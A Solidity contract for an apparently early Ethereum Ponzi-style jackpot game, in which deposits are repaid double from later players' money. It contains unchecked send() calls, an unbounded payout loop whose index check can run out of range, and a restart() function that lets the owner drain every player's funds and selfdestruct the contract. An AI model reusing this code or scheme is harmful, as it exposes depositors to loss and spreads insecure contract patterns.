 

contract TheGame {
     
     
    address public first_player;
     
    uint public regeneration;
     
    uint public jackpot;

     
    uint public collectedFee;

     
    address[] public playersAddresses;
    uint[] public playersAmounts;
    uint32 public totalplayers;
    uint32 public lastPlayerPaid;
     
    address public mainPlayer;
     
    uint32 public round;
     
    uint public amountAlreadyPaidBack;
     
    uint public amountInvested;

    uint constant SIX_HOURS = 60 * 60 * 6;

    function TheGame() {
         
        mainPlayer = msg.sender;
        first_player = msg.sender;
        regeneration = block.timestamp;
        amountAlreadyPaidBack = 0;
        amountInvested = 0;
        totalplayers = 0;
    }

    function contribute_toTheGame() returns(bool) {
        uint amount = msg.value;
         
        if (amount < 1 / 2 ether) {
            msg.sender.send(msg.value);
            return false;
        }
         
        if (amount > 25 ether) {
            msg.sender.send(msg.value - 25 ether);
            amount = 25 ether;
        }

         
        if (regeneration + SIX_HOURS < block.timestamp) {
             
             
            if (totalplayers == 1) {
                 
                playersAddresses[playersAddresses.length - 1].send(jackpot);
            } else if (totalplayers == 2) {
                 
                playersAddresses[playersAddresses.length - 1].send(jackpot * 70 / 100);
                playersAddresses[playersAddresses.length - 2].send(jackpot * 30 / 100);
            } else if (totalplayers >= 3) {
                 
                playersAddresses[playersAddresses.length - 1].send(jackpot * 70 / 100);
                playersAddresses[playersAddresses.length - 2].send(jackpot * 20 / 100);
                playersAddresses[playersAddresses.length - 3].send(jackpot * 10 / 100);
            }

             
            jackpot = 0;

             
            first_player = msg.sender;
            regeneration = block.timestamp;
            playersAddresses.push(msg.sender);
            playersAmounts.push(amount * 2);
            totalplayers += 1;
            amountInvested += amount;

             
            jackpot += amount;

             
            first_player.send(amount * 3 / 100);

             
            collectedFee += amount * 3 / 100;

            round += 1;
        } else {
             
            regeneration = block.timestamp;
            playersAddresses.push(msg.sender);
            playersAmounts.push(amount * 2);
            totalplayers += 1;
            amountInvested += amount;

             
            jackpot += (amount * 5 / 100);

             
            first_player.send(amount * 3 / 100);

             
            collectedFee += amount * 3 / 100;

while (playersAmounts[lastPlayerPaid] < (address(this).balance - jackpot - collectedFee) && lastPlayerPaid <= totalplayers) {
                playersAddresses[lastPlayerPaid].send(playersAmounts[lastPlayerPaid]);
                amountAlreadyPaidBack += playersAmounts[lastPlayerPaid];
                lastPlayerPaid += 1;
            }
        }
    }

     
    function() {
        contribute_toTheGame();
    }

     
    function restart() {
        if (msg.sender == mainPlayer) {
            mainPlayer.send(address(this).balance);
            selfdestruct(mainPlayer);
        }
    }

     
    function new_mainPlayer(address new_mainPlayer) {
        if (msg.sender == mainPlayer) {
            mainPlayer = new_mainPlayer;
        }
    }

     
    function collectFee() {
        if (msg.sender == mainPlayer) {
            mainPlayer.send(collectedFee);
        }
    }

     
    function newfirst_player(address newfirst_player) {
        if (msg.sender == first_player) {
            first_player = newfirst_player;
        }
    }       
}